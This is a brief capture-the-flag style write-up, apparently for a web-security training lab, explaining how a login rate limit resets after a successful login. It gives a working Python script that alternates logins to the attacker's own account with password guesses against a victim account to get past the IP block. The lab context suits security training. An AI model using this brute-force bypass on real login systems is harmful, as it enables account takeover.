# Lab: Broken brute-force protection, IP block
In this there is a auth flaw , that after every time a account is logged in successfuly from the ip , the ip rate limit resets 
\
So we login with correct creds after every bruteforce req
```bash
import requests
import time

# ===== CONFIG =====
BASE_URL = "https://0ae7004c04e03c91801ada90002c0099.web-security-academy.net"
LOGIN_URL = BASE_URL + "/login"

MY_USERNAME = "wiener"
MY_PASSWORD = "peter"

VICTIM_USERNAME = "carlos"

# Load candidate passwords
with open("pw.txt", "r") as f:
    passwords = [line.strip() for line in f]

session = requests.Session()

def login(username, password):
    data = {
        "username": username,
        "password": password
    }
    response = session.post(LOGIN_URL, data=data, allow_redirects=False)
    return response


print("[*] Starting attack...")

for pwd in passwords:

    # Step 1: Reset counter by logging into own account
    r = login(MY_USERNAME, MY_PASSWORD)

    if r.status_code != 302:
        print("[-] Failed to reset counter!")
        break

    # Step 2: Try victim login
    r = login(VICTIM_USERNAME, pwd)

    print(f"Trying: {pwd} -> Status: {r.status_code}")

    # Success usually gives 302 redirect to /my-account
    if r.status_code == 302:
        print(f"\n[+] PASSWORD FOUND: {pwd}")
        break

    time.sleep(0.2)  # small delay to avoid weird timing issues

print("[*] Done.")

```
